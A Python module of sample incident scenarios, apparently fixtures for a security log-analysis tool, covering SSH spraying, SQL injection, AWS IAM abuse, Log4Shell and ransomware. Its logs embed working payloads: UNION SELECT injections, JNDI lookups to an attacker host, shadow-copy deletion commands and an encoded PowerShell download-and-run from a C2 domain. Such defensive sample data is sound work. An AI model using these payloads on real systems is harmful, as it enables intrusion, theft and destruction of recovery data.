from typing import List
from ..models import SampleScenario

SAMPLE_SCENARIOS: List[SampleScenario] = [
    SampleScenario(
        id="ssh_brute_force",
        name="SSH Credential Stuffing & Priv-Escalation",
        badge="Linux Syslog",
        category="Initial Access & Privilege Escalation",
        description="High-frequency password spraying from an external IP followed by successful authentication as user 'deploy' and sudo elevation.",
        logs="""Oct 04 03:14:12 edge-srv-01 sshd[14202]: Failed password for invalid user admin from 198.51.100.42 port 54122 ssh2
Oct 04 03:14:14 edge-srv-01 sshd[14205]: Failed password for invalid user test from 198.51.100.42 port 54128 ssh2
Oct 04 03:14:16 edge-srv-01 sshd[14209]: Failed password for invalid user oracle from 198.51.100.42 port 54134 ssh2
Oct 04 03:14:18 edge-srv-01 sshd[14212]: Failed password for invalid user postgres from 198.51.100.42 port 54140 ssh2
Oct 04 03:14:21 edge-srv-01 sshd[14216]: Failed password for deploy from 198.51.100.42 port 54146 ssh2
Oct 04 03:14:23 edge-srv-01 sshd[14219]: Failed password for deploy from 198.51.100.42 port 54152 ssh2
Oct 04 03:14:27 edge-srv-01 sshd[14223]: Accepted password for deploy from 198.51.100.42 port 54160 ssh2
Oct 04 03:14:27 edge-srv-01 systemd-logind[788]: New session 482 of user deploy.
Oct 04 03:14:32 edge-srv-01 sudo[14240]: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Oct 04 03:14:32 edge-srv-01 sudo[14240]: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
Oct 04 03:14:45 edge-srv-01 kernel: [48921.11] audit: type=1400 audit(1728033285.102:49): apparmor="DENIED" operation="open" profile="/usr/sbin/tcpdump" name="/etc/shadow" pid=14280 comm="cat" requested_mask="r"
"""
    ),
    SampleScenario(
        id="sqli_attack",
        name="SQL Injection & Database Schema Exfiltration",
        badge="Web Server Access",
        category="Exploit Public-Facing Application",
        description="Nginx/Apache web server access log showing SQL injection probes on product endpoints attempting UNION SELECT data extraction.",
        logs="""203.0.113.88 - - [04/Oct/2026:04:12:01 +0000] "GET /api/v1/products?category=electronics HTTP/1.1" 200 4521 "Mozilla/5.0"
203.0.113.88 - - [04/Oct/2026:04:12:08 +0000] "GET /api/v1/products?category=electronics' HTTP/1.1" 500 1289 "Mozilla/5.0"
203.0.113.88 - - [04/Oct/2026:04:12:15 +0000] "GET /api/v1/products?category=electronics'%20OR%20'1'='1 HTTP/1.1" 200 18450 "Mozilla/5.0"
203.0.113.88 - - [04/Oct/2026:04:12:22 +0000] "GET /api/v1/products?category=electronics' UNION SELECT 1,version(),user(),4-- HTTP/1.1" 200 5620 "Mozilla/5.0"
203.0.113.88 - - [04/Oct/2026:04:12:35 +0000] "GET /api/v1/products?category=electronics' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns WHERE table_schema=database()-- HTTP/1.1" 200 32410 "Mozilla/5.0"
203.0.113.88 - - [04/Oct/2026:04:12:49 +0000] "GET /api/v1/products?category=electronics' UNION SELECT 1,username,password_hash,email FROM app_users-- HTTP/1.1" 200 89200 "Mozilla/5.0"
"""
    ),
    SampleScenario(
        id="aws_cloudtrail",
        name="AWS CloudTrail IAM Abuse & S3 Exfiltration",
        badge="Cloud Audit",
        category="Defense Evasion & Exfiltration",
        description="Compromised AWS developer credentials used from an anomalous IP to create rogue access keys and turn an S3 bucket public.",
        logs="""{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDAJEXAMPLEUSER123",
    "arn": "arn:aws:iam::123456789012:user/developer-alex",
    "accountId": "123456789012",
    "userName": "developer-alex"
  },
  "eventTime": "2026-10-04T05:22:18Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateAccessKey",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "198.51.100.99",
  "userAgent": "aws-cli/2.15.15 Python/3.11.8 Linux/x86_64",
  "requestParameters": {
    "userName": "developer-alex"
  },
  "responseElements": {
    "accessKey": {
      "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
      "status": "Active"
    }
  }
}
{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "arn": "arn:aws:iam::123456789012:user/developer-alex",
    "userName": "developer-alex"
  },
  "eventTime": "2026-10-04T05:24:02Z",
  "eventSource": "s3.amazonaws.com",
  "eventName": "PutBucketAcl",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "198.51.100.99",
  "requestParameters": {
    "bucketName": "finance-records-production",
    "AccessControlPolicy": {
      "Grants": [
        {
          "Grantee": { "URI": "http://acs.amazonaws.com/groups/global/AllUsers" },
          "Permission": "READ"
        }
      ]
    }
  }
}
"""
    ),
    SampleScenario(
        id="log4shell_rce",
        name="Log4Shell JNDI Exploit & C2 Beaconing",
        badge="Zero-Day RCE",
        category="Remote Code Execution",
        description="Apache HTTP access log with CVE-2021-44228 JNDI injection attempts targeting internal LDAP callback infrastructure.",
        logs="""45.154.255.8 - - [04/Oct/2026:06:01:14 +0000] "GET /login HTTP/1.1" 200 4820 "-" "${jndi:ldap://45.154.255.8:1389/Exploit}"
45.154.255.8 - - [04/Oct/2026:06:01:15 +0000] "POST /api/auth HTTP/1.1" 400 321 "https://corp.target.com/login" "${jndi:rmi://45.154.255.8:1099/Object}"
45.154.255.8 - - [04/Oct/2026:06:01:22 +0000] "GET /app?token=${jndi:dns://45.154.255.8/cve-2021-44228} HTTP/1.1" 200 1205 "-" "curl/7.68.0"
45.154.255.8 - - [04/Oct/2026:06:01:45 +0000] "GET /download/patch.sh HTTP/1.1" 200 14890 "-" "Wget/1.20.3 (linux-gnu)"
"""
    ),
    SampleScenario(
        id="ransomware_endpoint",
        name="Endpoint Ransomware Activity & Shadow Copy Purge",
        badge="Windows Endpoint",
        category="Impact & Inhibit Recovery",
        description="Windows Event log and command telemetry revealing volume shadow copy deletion and obfuscated PowerShell staging.",
        logs="""2026-10-04 07:11:02 | EventID: 4688 | Process Creation
New Process Name: C:\\Windows\\System32\\vssadmin.exe
Process Command Line: vssadmin delete shadows /all /quiet
Parent Process: C:\\Windows\\System32\\cmd.exe (PID: 3840)
Account Name: Administrator | Logon ID: 0x19A2E

2026-10-04 07:11:05 | EventID: 4688 | Process Creation
New Process Name: C:\\Windows\\System32\\bcdedit.exe
Process Command Line: bcdedit /set {default} recoveryenabled No
Parent Process: C:\\Windows\\System32\\cmd.exe (PID: 3840)

2026-10-04 07:11:12 | EventID: 4104 | PowerShell Script Block Logging
ScriptBlock ID: 88f219b2-3c22-4e91-8172-1a733b118b77
Script Content: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwB0AGEAZwBpAG4AZwAtAGMAMgAuAG4AZQB0AC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==
"""
    )
]

def get_sample_scenarios() -> List[SampleScenario]:
    return SAMPLE_SCENARIOS
